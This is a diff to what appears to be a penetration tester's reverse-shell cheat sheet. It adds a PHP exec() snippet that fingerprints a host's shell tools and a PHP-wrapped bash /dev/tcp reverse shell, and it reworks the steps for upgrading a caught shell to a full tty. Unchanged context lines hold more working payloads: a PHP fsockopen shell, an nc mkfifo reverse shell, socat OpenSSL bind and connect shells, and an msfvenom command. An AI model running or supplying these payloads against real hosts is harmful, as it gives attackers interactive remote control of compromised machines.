@@ -38,15 +38,17 @@ msfvenom --payload $payload LHOST=$hip LPORT=$hport --format psh | msfvenom --pa
 [Shell Folder](file:////home/kali/Documents/shells/)
 
 ## Determine compatibility
-Linux:
-```bash
-whoami;echo ----------;bash --version;echo ----------;which nc;echo ----------;python --version;echo ----------;php --version;echo ----------;perl --version
+```php
+<?php $outarr = array(); exec("whoami;echo ----------BASH;bash --version;echo ----------NC;which nc;echo ----------SOCAT;which socat;echo ----------PYTHON;python --version;echo ----------PHP;php --version;echo ----------PERL;perl --version",$outarr);print_r($outarr); ?>
 ```
 ## Universal
 
-PHP (`php -r ''`)
+PHP (`php -r ''` or `<?php payload ?>)
 ```php
 $sock=fsockopen("$hip",$hport);exec("/bin/sh -i <&3 >&3 2>&3");
+```
+```php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$hip/$hport 0>&1'");
 ```
 Python (`python -c ''`)
 ```python
@@ -107,6 +109,10 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $hip $hport >/tmp/f
 
 ## Upgrades
 
+Determine compatibility
+```bash
+whoami;echo ----------BASH;bash --version;echo ----------NC;which nc;echo ----------SOCAT;which socat;echo ----------PYTHON;python --version;echo ----------PHP;php --version;echo ----------PERL;perl --version
+```
 Perl
 ```perl
 perl -e 'exec "/bin/bash";'
@@ -142,25 +148,20 @@ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:$ip:443,verify=0
 ```
 
-tty
-```bash
-nc -lvnp 4444&
-```
-
+Via tty
+1. Background reverse shell with Strg+Z
+2. Get information about the shell and set its output to echo
 ```bash
 echo $TERM && stty -a && stty raw -echo
 ```
-
-`fg` and `reset`
-
+3. Open the shell again with `fg` (you won't see it get displayed)
+4. Enter `reset` (this should get displayed again as we're now within the reverse shell)
+5. Edit reverse shell parameters according to the information gathered in the second step
 ```bash
 export SHELL=bash
 export TERM=xterm256-color
 stty rows 38 columns 116
 ```
-(adjust according to the information colleted above)
-
-
 ## Fixes
 Check wheter we are in CMD or Powershell
 ```
@@ -174,15 +175,6 @@ Check if `PS` is interactive
 ```powershell
 [Environment]::GetCommandLineArgs()
 ```
-
-Fix Output
-```bash
-stty raw -echo
-```
-Set TERM
-```bash
-export TERM=xterm
-```
 Get Window Size
 ```bash
 stty size
@@ -194,10 +186,6 @@ stty rows X cols Y
 Fix PATH
 ```bash
 export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-```
-Add colors
-```bash
-export TERM=xterm-256color
 ```
 Reload bash
 ```bash
